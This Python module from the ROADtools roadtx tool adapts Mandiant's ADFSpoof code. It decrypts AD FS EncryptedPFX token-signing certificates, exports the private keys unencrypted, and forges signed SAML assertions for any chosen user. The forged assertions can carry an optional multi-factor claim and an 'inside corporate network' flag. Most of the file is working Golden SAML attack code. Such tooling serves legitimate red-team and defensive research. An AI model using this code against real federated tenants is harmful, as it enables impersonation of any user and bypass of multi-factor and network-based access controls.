# This file uses code from https://github.com/mandiant/ADFSpoof under the Apache 2 license
#
# Copyright 2021 Mandiant
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Custom additions are licensed under ROADtools default MIT license

import struct
import base64
import uuid
import re

from enum import Enum
from datetime import datetime, timedelta
from lxml import etree

from OpenSSL.crypto import X509
from cryptography import x509
from cryptography import utils
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import constant_time, hashes, hmac, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf import KeyDerivationFunction
from cryptography.exceptions import (
    AlreadyFinalized, InvalidKey, UnsupportedAlgorithm, _Reasons
)
from pyasn1.type.univ import ObjectIdentifier, OctetString
from pyasn1.codec.der.decoder import decode as der_decode
from pyasn1.codec.der.encoder import encode

from signxml import XMLSigner

def encode_object_guid(guid):
    guid = uuid.UUID(guid)
    immutable_id = base64.b64encode(guid.bytes_le).decode('utf-8')
    return immutable_id

# ADFSpoof custom cryptography
class Mode(Enum):
    CounterMode = "ctr"

class CounterLocation(Enum):
    BeforeFixed = "before_fixed"
    AfterFixed = "after_fixed"

class KBKDFHMAC(KeyDerivationFunction):
    def __init__(self, algorithm, mode, length, rlen, llen,
                 location, label, context, fixed, backend):
        if not isinstance(algorithm, hashes.HashAlgorithm):
            raise UnsupportedAlgorithm(
                "Algorithm supplied is not a supported hash algorithm.",
                _Reasons.UNSUPPORTED_HASH
            )

        if not backend.hmac_supported(algorithm):
            raise UnsupportedAlgorithm(
                "Algorithm supplied is not a supported hmac algorithm.",
                _Reasons.UNSUPPORTED_HASH
            )

        if not isinstance(mode, Mode):
            raise TypeError("mode must be of type Mode")

        if not isinstance(location, CounterLocation):
            raise TypeError("location must be of type CounterLocation")

        if (label or context) and fixed:
            raise ValueError("When supplying fixed data, "
                             "label and context are ignored.")

        if rlen is None or not self._valid_byte_length(rlen):
            raise ValueError("rlen must be between 1 and 4")

        if llen is None and fixed is None:
            raise ValueError("Please specify an llen")

        if llen is not None and not isinstance(llen, int):
            raise TypeError("llen must be an integer")

        if label is None:
            label = b''

        if context is None:
            context = b''

        utils._check_bytes("label", label)
        utils._check_bytes("context", context)
        self._algorithm = algorithm
        self._mode = mode
        self._length = length
        self._rlen = rlen
        self._llen = llen
        self._location = location
        self._label = label
        self._context = context
        self._backend = backend
        self._used = False
        self._fixed_data = fixed

    def _valid_byte_length(self, value):
        if not isinstance(value, int):
            raise TypeError('value must be of type int')

        value_bin = utils.int_to_bytes(1, value)
        if not 1 <= len(value_bin) <= 4:
            return False
        return True

    def derive(self, key_material):
        if self._used:
            raise AlreadyFinalized

        utils._check_byteslike("key_material", key_material)
        self._used = True

        # inverse floor division (equivalent to ceiling)
        rounds = -(-self._length // self._algorithm.digest_size)

        output = [b'']

        # For counter mode, the number of iterations shall not be
        # larger than 2^r-1, where r <= 32 is the binary length of the counter
        # This ensures that the counter values used as an input to the
        # PRF will not repeat during a particular call to the KDF function.
        r_bin = utils.int_to_bytes(1, self._rlen)
        if rounds > pow(2, len(r_bin) * 8) - 1:
            raise ValueError('There are too many iterations.')

        for i in range(1, rounds + 1):
            h = hmac.HMAC(key_material, self._algorithm, backend=self._backend)

            counter = utils.int_to_bytes(i, self._rlen)
            if self._location == CounterLocation.BeforeFixed:
                h.update(counter)

            h.update(self._generate_fixed_input())

            if self._location == CounterLocation.AfterFixed:
                h.update(counter)

            output.append(h.finalize())

        return b''.join(output)[:self._length]

    def _generate_fixed_input(self):
        if self._fixed_data and isinstance(self._fixed_data, bytes):
            return self._fixed_data

        l_val = utils.int_to_bytes(self._length, self._llen)

        return b"".join([self._label, b"\x00", self._context, l_val])

    def verify(self, key_material, expected_key):
        if not constant_time.bytes_eq(self.derive(key_material), expected_key):
            raise InvalidKey

# ADFSpoof EncryptedPFX modified for roadtx
class EncryptedPFX():
    def __init__(self, pfxdata, key, debug=False):
        self.debug = debug
        self.decryption_key = key
        self._raw = pfxdata
        self.encryption_key = None
        self.mac_key = None
        self.decode()

    def decrypt_pfx(self):
        self._derive_keys(self.decryption_key)
        self._verify_ciphertext()

        backend = default_backend()
        iv = self.iv.asOctets()
        cipher = Cipher(algorithms.AES(self.encryption_key), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        plain_pfx = decryptor.update(self.ciphertext) + decryptor.finalize()

        if self.debug:
            print(f"Decrypted PFX: {plain_pfx}\n")
        return plain_pfx

    @staticmethod
    def save_pfx(pfxdata, pfxfile):
        with open(pfxfile, 'wb') as pfx_file:
            pfx_file.write(pfxdata)

    @staticmethod
    def save_pem(pfxdata, certfile, keyfile):
        key, cert, _ = pkcs12.load_key_and_certificates(pfxdata, None, default_backend())
        with open(keyfile, "wb") as keyf:
            keyf.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        with open(certfile, "wb") as certf:
            certf.write(cert.public_bytes(serialization.Encoding.PEM))

    def _verify_ciphertext(self):
        backend = default_backend()
        h = hmac.HMAC(self.mac_key, hashes.SHA256(), backend=backend)
        stream = self.iv.asOctets() + self.ciphertext
        h.update(stream)
        mac_code = h.finalize()

        if mac_code != self.mac:
            raise TypeError((
                                "Calculated MAC did not match anticipated MAC\n"
                                f"Calculated MAC: {mac_code}\n"
                                f"Expected MAC: {self.mac}\n"
                            ))
        if self.debug:
            print(f"MAC Calculated over IV and Ciphertext: {mac_code}\n")

    def _derive_keys(self, password=None):
        label = encode(self.encryption_oid) + encode(self.mac_oid)
        context = self.nonce.asOctets()
        backend = default_backend()

        kdf = KBKDFHMAC(
            algorithm=hashes.SHA256(),
            mode=Mode.CounterMode,
            length=48,
            rlen=4,
            llen=4,
            location=CounterLocation.BeforeFixed,
            label=label,
            context=context,
            fixed=None,
            backend=backend
        )

        key = kdf.derive(password)
        if self.debug:
            print(f"Derived key: {key}\n")

        self.encryption_key = key[0:16]
        self.mac_key = key[16:]

    def _decode_octet_string(self, remains=None):
        if remains:
            buff = remains
        else:
            buff = self._raw[8:]
        octet_string, remains = der_decode(buff, OctetString())

        return octet_string, remains

    def _decode_length(self, buff):
        bytes_read = 1
        length_initial = buff[0]
        if length_initial < 127:
            length = length_initial

        else:
            length_initial &= 127
            input_arr = []
            for x in range(0, length_initial):
                input_arr.append(buff[x + 1])
                bytes_read += 1
            length = input_arr[0]
            for x in range(1, length_initial):
                length = input_arr[x] + (length << 8)

        if self.debug:
            print(f"Decoded length: {length}\n")
        return length, buff[bytes_read:]

    def _decode_groupkey(self):
        octet_stream, remains = self._decode_octet_string()

        guid = uuid.UUID(bytes_le=bytes(octet_stream))

        if self.debug:
            print(f"Decoded GroupKey GUID {guid}\n")
        return guid, remains

    def _decode_authencrypt(self, buff):
        _, remains = der_decode(buff, ObjectIdentifier())
        mac_oid, remains = der_decode(remains, ObjectIdentifier())
        encryption_oid, remains = der_decode(remains, ObjectIdentifier())

        if self.debug:
            print(f"Decoded Algorithm OIDS\n Encryption Algorithm OID: {encryption_oid}\n MAC Algorithm OID: {mac_oid}\n")
        return encryption_oid, mac_oid, remains

    def decode(self):
        version, method = struct.unpack('>II', self._raw[0:8])

        if version != 1:
            raise TypeError("EncryptedPfx version should be 1   .\n")

        if method != 0:
            raise TypeError("Not using EncryptThenMAC. Currently only EncryptThenMAC is supported.")

        self.guid, remains = self._decode_groupkey()

        self.encryption_oid, self.mac_oid, remains = self._decode_authencrypt(remains)

        self.nonce, remains = self._decode_octet_string(remains)
        self.iv, remains = self._decode_octet_string(remains)
        self.mac_length, remains = self._decode_length(remains)
        self.ciphertext_length, remains = self._decode_length(remains)
        self.ciphertext = remains[:self.ciphertext_length - self.mac_length]
        self.mac = remains[self.ciphertext_length - self.mac_length:]

        if self.debug:
            print(f"Decoded nonce: {self.nonce.asOctets()}")
            print(f"Decoded IV: {self.iv.asOctets()}")
            print(f"Decoded MAC length: {self.mac_length}")
            print(f"Decoded Ciphertext length: {self.ciphertext_length}")
            print(f"Decoded Ciphertext: {self.ciphertext}")
            print(f"Decoded MAC: {self.mac}")


# SAMLSigner adapted for roadtx from ADFSpoof
class SAMLSigner():
    def __init__(self, template=None, password=None):
        if template:
            self.saml_template = template
        else:
            self.saml_template = MSSAML_TEMPLATE.replace('\n', '')
            self.saml_template = re.sub(r'\s+', ' ', self.saml_template)
        self.privkey = None
        self.keydata = None
        self.certificate = None

    def loadcert(self, pemfile=None, privkeyfile=None, pfxfile=None, pfxpass=None, pfxbase64=None):
        """
        Load a device certificate from disk
        """
        if pemfile and privkeyfile:
            with open(pemfile, "rb") as certf:
                self.certificate = x509.load_pem_x509_certificate(certf.read())
            with open(privkeyfile, "rb") as keyf:
                self.keydata = keyf.read()
                self.privkey = serialization.load_pem_private_key(self.keydata, password=None)
            return True
        if pfxfile or pfxbase64:
            if pfxfile:
                with open(pfxfile, 'rb') as pfxf:
                    pfxdata = pfxf.read()
            if pfxbase64:
                pfxdata = base64.b64decode(pfxbase64)
            if isinstance(pfxpass, str):
                pfxpass = pfxpass.encode()
            self.privkey, self.certificate, _ = pkcs12.load_key_and_certificates(pfxdata, pfxpass)
            # PyJWT needs the key as PEM data anyway, so encode it
            self.keydata = self.privkey.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            )
            return True
        print('You must specify either a PEM certificate file and private key file or a pfx file with the device keypair.')
        return False

    def format_template(self, immutable_id, upn, server, mfa=False):
        now = datetime.utcnow()
        hour = timedelta(hours=1)
        token_created = (now).strftime('%Y-%m-%dT%H:%M:%S.000Z')
        token_expires = (now + hour).strftime('%Y-%m-%dT%H:%M:%S.000Z')
        # Put some letters in front to prevent it starting with a number which is invalid according to spec
        assertionid = 'rtx' + str(uuid.uuid4())


        if mfa:
            mfa_att = '<saml:Attribute AttributeName="authnmethodsreferences" AttributeNamespace="http://schemas.microsoft.com/claims"><saml:AttributeValue>http://schemas.microsoft.com/claims/multipleauthn</saml:AttributeValue></saml:Attribute>'
        else:
            mfa_att = ''
        templ = self.saml_template.format(assertionid=assertionid, nbf=token_created, exp=token_expires, upn=upn, unique_id=immutable_id, mfa=mfa_att, issuer=server)
        return templ, assertionid

    def sign_xml(self, saml_string, assertionid, algorithm='rsa-sha256', digest='sha256'):
        id_attribute = "AssertionID"
        data = etree.fromstring(saml_string)

        signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
                           signature_algorithm=algorithm,
                           digest_algorithm=digest)
        signed_xml = signer.sign(data,
                                 key=self.privkey,
                                 cert=[self.certificate],
                                 reference_uri=assertionid,
                                 id_attribute=id_attribute)
        signed_saml_string = etree.tostring(signed_xml).replace(b'\n', b'')
        signed_saml_string = re.sub(b'-----(BEGIN|END) CERTIFICATE-----', b'', signed_saml_string)
        return signed_saml_string

MSSAML_TEMPLATE = '''<saml:Assertion MajorVersion="1" MinorVersion="1" AssertionID="{assertionid}" Issuer="http://{issuer}/adfs/services/trust/" IssueInstant="{nbf}"
    xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion">
    <saml:Conditions NotBefore="{nbf}" NotOnOrAfter="{exp}">
        <saml:AudienceRestrictionCondition>
            <saml:Audience>urn:federation:MicrosoftOnline</saml:Audience>
        </saml:AudienceRestrictionCondition>
    </saml:Conditions>
    <saml:AttributeStatement>
        <saml:Subject>
            <saml:NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{unique_id}</saml:NameIdentifier>
            <saml:SubjectConfirmation>
                <saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Attribute AttributeName="UPN" AttributeNamespace="http://schemas.xmlsoap.org/claims">
            <saml:AttributeValue>{upn}</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute AttributeName="ImmutableID" AttributeNamespace="http://schemas.microsoft.com/LiveID/Federation/2008/05">
            <saml:AttributeValue>{unique_id}</saml:AttributeValue>
        </saml:Attribute>
        {mfa}
        <saml:Attribute AttributeName="insidecorporatenetwork" AttributeNamespace="http://schemas.microsoft.com/ws/2012/01" a:OriginalIssuer="CLIENT CONTEXT"
            xmlns:a="http://schemas.xmlsoap.org/ws/2009/09/identity/claims">
            <saml:AttributeValue b:type="tn:boolean"
                xmlns:b="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:tn="http://www.w3.org/2001/XMLSchema">true
            </saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
    <saml:AuthenticationStatement AuthenticationMethod="urn:oasis:names:tc:SAML:1.0:am:password" AuthenticationInstant="{nbf}">
        <saml:Subject>
            <saml:NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{unique_id}</saml:NameIdentifier>
            <saml:SubjectConfirmation>
                <saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod>
            </saml:SubjectConfirmation>
        </saml:Subject>
    </saml:AuthenticationStatement>
</saml:Assertion>
'''
